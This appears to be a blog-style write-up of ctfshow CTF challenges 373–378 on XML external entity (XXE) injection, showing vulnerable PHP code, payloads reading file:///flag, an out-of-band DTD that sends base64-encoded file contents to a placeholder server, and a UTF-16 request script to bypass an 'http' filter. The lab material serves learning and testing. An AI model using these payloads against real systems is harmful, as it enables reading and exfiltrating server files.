---
title: ctfshow-xxe
id: ctfshow-xxe
date: 2021-08-21 13:33:33
sidebar_position: 13
---

<!-- more -->


[从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6887)

[一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/3357)

[XML外部实体（XXE）注入详解 - 渗透测试中心 - 博客园 (cnblogs.com)](https://www.cnblogs.com/backlion/p/9302528.html)

## 373

> ```php
> <?php
> 
> error_reporting(0);
> libxml_disable_entity_loader(false);	#为TRUE则禁用外部实体
> $xmlfile = file_get_contents('php://input');
> if(isset($xmlfile)){
>     $dom = new DOMDocument();
>     $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
>     $creds = simplexml_import_dom($dom);
>     
>     $ctfshow = $creds->ctfshow;
>     echo $ctfshow;
> }
> highlight_file(__FILE__);    
> 
> ```
>
> 利用伪协议php://input获得传入的xml数据
>
> loadXML()接收两个参数：1、包含xml文档的字符串；2、保存libxml选项常量的按位
> 		LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
> 		LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件

payload:

```xml
<!DOCTYPE payload[
<!ENTITY a SYSTEM "file:///flag">
]>
<na0h>
<ctfshow>&a;</ctfshow>
</na0h>
```

## 374、375、376-无回显

> ```php
> <?php
> 
> error_reporting(0);
> libxml_disable_entity_loader(false);
> $xmlfile = file_get_contents('php://input');
> if(isset($xmlfile)){
>     $dom = new DOMDocument();
>     $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
> }
> highlight_file(__FILE__);    
> 
> ```

无回显，需要把数据外带出来
这里可以用python简单的搭一个静态服务器用于监听

```python
py -m http.server 6666
```

在服务器构造一个dtd文件

test.dtd

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://xxx:6666/?x=%file;'>">
%a;
%b;
```

嵌套的`%`需要写成十六进制的`&#x25;`或者其他进制也行

payload:

```xml-dtd
<!DOCTYPE hhh [<!ENTITY % c SYSTEM "http://xxx:6666/test.dtd">
%c;
]>
```

```
这里实体c调用了外部实体test.dtd，然后调用了其中的参数实体a和b，b调用其中的file
就利用伪协议读到flag了
```

![](https://i.loli.net/2021/08/23/L4coRJm59GruVXe.png)

base64解码即可

> ```php
> if(preg_match('/<\?xml version="1\.0"/', $xmlfile)){
>     die('error');
> }
> ```
>
> 375、376过滤了XML声明，还是上面的payload就行
> 想绕过的话在中间多打几个空格也就绕过了

## 377-utf-16

```php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

过滤了http，这里改用utf-16编码发包就能绕过了

```python
import requests

url = 'http://d608152d-15f9-468d-a1f4-dfb89bde6d3a.challenge.ctf.show:8080/'
payload = """<!DOCTYPE hhh [<!ENTITY % c SYSTEM "http://xxx:6666/test.dtd">
%c;
]>"""
payload = payload.encode('utf-16')
requests.post(url, data=payload)
```

看一下utf-8和utf-16的区别

![](https://i.loli.net/2021/08/23/aXHBIR6PYxp5D2t.png)

## 378-python X

这题是python XXE漏洞

构造一下：

```xml
<!DOCTYPE payload[
<!ENTITY a SYSTEM "file:///flag">
]>
```

![](https://i.loli.net/2021/08/23/jKVeTEWos5MD9FH.png)
